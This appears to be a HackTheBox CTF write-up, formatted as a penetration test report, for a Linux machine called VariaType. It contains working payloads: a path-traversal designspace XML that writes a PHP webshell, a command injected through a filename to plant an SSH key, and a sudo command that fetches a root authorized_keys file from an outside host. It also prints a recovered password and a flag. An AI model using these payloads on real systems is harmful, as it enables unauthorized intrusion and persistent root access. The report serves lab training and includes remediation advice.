# Penetration Test Report — HackTheBox VariaType

**Date:** April 9, 2026
**Difficulty:** Medium
**OS:** Linux (Debian)

---

## Executive Summary

VariaType is a medium-difficulty Linux machine on HackTheBox that demonstrates how chained misconfigurations and insecure development practices can lead to full system compromise. Starting from a public-facing web application, the attack chain progressed through credential recovery from exposed git history, remote code execution via a vulnerable font processing library, lateral movement through an unsafe cron job, and finally privilege escalation to root via a misconfigured sudo rule combined with a path traversal vulnerability in Python's setuptools library.

---

## Scope

| Item | Detail |
|------|--------|
| Target IP | 10.129.244.202 |
| Hostname | variatype.htb / portal.variatype.htb |
| OS | Linux — Debian 6.1.0-43-amd64 |
| Engagement Type | Black Box CTF |

---

## Methodology

The assessment followed standard penetration testing phases:

1. Reconnaissance and enumeration
2. Vulnerability identification
3. Exploitation and initial access
4. Post-exploitation and lateral movement
5. Privilege escalation
6. Proof of access

---

## Findings

### Finding 1 — Exposed Git Repository (Information Disclosure)

**Severity:** High  
**Location:** `http://portal.variatype.htb/.git/`

The portal subdomain had its `.git` directory publicly accessible. Using `git-dumper`, the full repository was reconstructed locally. Analysis of git history revealed a commit containing hardcoded credentials that had been removed from the current codebase but remained accessible in the commit log.

**Recovered Credentials:**
- Username: `gitbot`
- Password: `G1tB0t_Acc3ss_2025!`

**Commands used:**
```bash
git-dumper http://portal.variatype.htb/.git/ ./portal-source
git show 6f021da6be7086f2595befaa025a83d1de99478b
```

---

### Finding 2 — Arbitrary File Write via CVE-2025-66034 (RCE)

**Severity:** Critical  
**Location:** `http://variatype.htb/tools/variable-font-generator/process`  
**CVE:** CVE-2025-66034

The font generator endpoint accepted `.designspace` XML files processed by the Python `fontTools` library. The vulnerable version failed to sanitize the `filename` attribute in the `<variable-font>` element, allowing path traversal to write files anywhere on the filesystem. Additionally, content embedded in `<labelname>` XML elements within the `<axis>` definition was injected directly into the output font file.

By crafting a malicious designspace file targeting `/var/www/portal.variatype.htb/public/files/shell.php`, a PHP webshell was written to the server's web root, resulting in remote code execution as `www-data`.

**Malicious designspace:**
```xml
<designspace format="5.0">
<axes>
<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
<labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]></labelname>
</axis>
</axes>
<sources>
<source filename="source-light.ttf" name="Light">
<location><dimension name="Weight" xvalue="100"/></location>
</source>
<source filename="source-regular.ttf" name="Regular">
<location><dimension name="Weight" xvalue="400"/></location>
</source>
</sources>
<variable-fonts>
<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
<axis-subsets><axis-subset name="Weight"/></axis-subsets>
</variable-font>
</variable-fonts>
</designspace>
```

**RCE confirmed:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Finding 3 — FontForge Filename Command Injection via CVE-2024-25082

**Severity:** High  
**CVE:** CVE-2024-25082

A cron job running under the context of the `steve` user monitored a directory for `.zip` files and passed extracted filenames directly to FontForge without sanitization. FontForge's Splinefont parsing mechanism executed shell subshell constructs embedded in filenames.

A malicious ZIP was crafted containing a file whose name embedded a command that injected an SSH public key into `steve`'s `authorized_keys`:

```python
payload = 'x$(mkdir -p /home/steve/.ssh && echo "SSH_PUB_KEY" >> /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys).ttf'
```

After uploading the ZIP via the webshell and waiting for the cron job to execute, SSH access was gained as `steve`.

**User flag:** `6ae9e073c73b81c730b0417b3da9820f`

---

### Finding 4 — Sudo Misconfiguration + CVE-2025-47273 (Privilege Escalation to Root)

**Severity:** Critical  
**CVE:** CVE-2025-47273

The `steve` user could execute a Python script as root without a password:

```
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

The script used Python's `setuptools` `PackageIndex` to download files from a provided URL. Versions of setuptools prior to 78.1.1 contained a path traversal vulnerability where URL-encoded slashes (`%2F`) in the URL endpoint were decoded after path sanitization, allowing the downloaded file to be written to an arbitrary absolute path on the filesystem.

By hosting a custom HTTP server serving an SSH public key and passing a URL with encoded path separators, the key was written directly to `/root/.ssh/authorized_keys`:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  'http://10.10.15.128:8889/%2Froot%2F.ssh%2Fauthorized_keys'
```

**Output:**
```
[INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

SSH access was then obtained as root using the corresponding private key.

---

## Proof of Access

| Access Level | Method | Evidence |
|---|---|---|
| www-data | CVE-2025-66034 PHP webshell | `uid=33(www-data)` |
| steve | CVE-2024-25082 cron job injection | `user.txt: 6ae9e073c73b81c730b0417b3da9820f` |
| root | CVE-2025-47273 setuptools path traversal | SSH login as root |

---

## Privilege Escalation Chain

```
Anonymous
  → gitbot credentials (git history exposure)
  → www-data (CVE-2025-66034 fontTools RCE)
  → steve (CVE-2024-25082 FontForge cron injection)
  → root (CVE-2025-47273 setuptools sudo abuse)
```

---

## Impact

Full compromise of the target system. An attacker with this level of access could read all sensitive data, modify system files, pivot to other network hosts, establish persistent backdoors, and completely control the system.

---

## Remediation

| Finding | Recommended Fix |
|---|---|
| Exposed `.git` directory | Block access to `.git` in nginx config: `location ~ /\.git { deny all; }` |
| Hardcoded credentials in git history | Rotate all exposed credentials immediately; use git-filter-repo to purge from history |
| CVE-2025-66034 (fontTools) | Upgrade fontTools to a patched version; sanitize and validate all user-supplied XML |
| CVE-2024-25082 (FontForge cron) | Sanitize filenames before passing to shell commands; use allowlists for valid characters |
| Sudo misconfiguration | Remove or restrict the sudo rule; never allow wildcard arguments to privileged scripts |
| CVE-2025-47273 (setuptools) | Upgrade setuptools to 78.1.1 or later; validate and sanitize all URL inputs |

---

*This report was produced for educational purposes as part of the HackTheBox CTF platform. All testing was performed in an authorized, isolated lab environment.*
